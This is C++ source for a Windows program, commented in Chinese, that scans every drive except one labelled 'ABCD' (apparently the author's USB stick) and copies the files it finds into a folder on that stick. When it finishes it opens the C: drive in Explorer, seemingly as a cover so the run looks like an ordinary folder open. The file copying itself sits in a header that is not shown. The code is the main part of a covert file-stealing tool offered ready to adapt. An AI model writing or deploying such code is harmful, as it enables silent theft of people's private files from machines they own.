/*
 *点击运行后自动判断所有盘符，逐个扫描，跳过卷标为ABCD（可以自己修改）的磁盘，
 *扫描出的文件保存到卷标为ABCD那个磁盘a文件夹下（自动创建，可以手动修改保存位置）。
 *如果没有卷标为ABCD的磁盘，则跳过扫描，直接结束。
 *任务完成后，打开C盘
*/

#include "sDisk.h"
#include <vector>

using namespace std;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    char szDriverBuffer[512];
    vector<string> csDriver;//存储需要扫描的盘符
    string myDriver;//存储我的U盘的盘符
    myDriver.clear();//初始化为空
    char Volumelabel[20] = {0};
    DWORD SerialNumber;
    DWORD MaxCLength;
    DWORD FileSysFlag;
    char FileSysName[10] = {0};
    GetLogicalDriveStringsA(IN 512, OUT szDriverBuffer);//得到盘符
    // 执行后，在szDriverBuffer中存储的盘符数据格式：
    // C:\\<nul>D:\\<nul><nul>

    char *lpDriverBuffer = szDriverBuffer;
    while (*lpDriverBuffer != NULL)
    {
        //得到卷标
        GetVolumeInformationA(lpDriverBuffer,Volumelabel,255,&SerialNumber,&MaxCLength,&FileSysFlag,FileSysName,255);
        if (0 != strcmp(Volumelabel,"ABCD")) //储存在卷标为“ ”中的磁盘，修改卷标在这儿修改
        {
            csDriver.push_back(lpDriverBuffer);
        }
        else
        {
            myDriver = lpDriverBuffer;
        }

        //cout << lpDriverBuffer << "  " << Volumelabel << endl;

        lpDriverBuffer = lpDriverBuffer + strlen(lpDriverBuffer)+1;//csDriver.length() + 1;
        memset(Volumelabel, '\0', 20 );

    }

    if (myDriver.empty())//如果没有这个卷标的磁盘，直接结束
    {
        ShellExecuteA(NULL, "explore", "c:\\", NULL, NULL, SW_SHOWNORMAL);//打开我的电脑
        return 0;
    }
    else
    {
        myDriver = myDriver + "a\\";//存在磁盘的那个文件夹，修改a来修改保存文件夹名字
        CreateDirectoryA(myDriver.c_str() ,NULL);
        for (unsigned int i = 0; i<csDriver.size(); ++i)
        {
            //cout << csDriver.at(i) <<endl;

            ListDir(csDriver.at(i),myDriver);
            //system ("pause");
        }

        // system ("pause");

        ShellExecuteA(NULL, "explore", "c:\\", NULL, NULL, SW_SHOWNORMAL);//打开我的电脑
        return 0;
    }
}
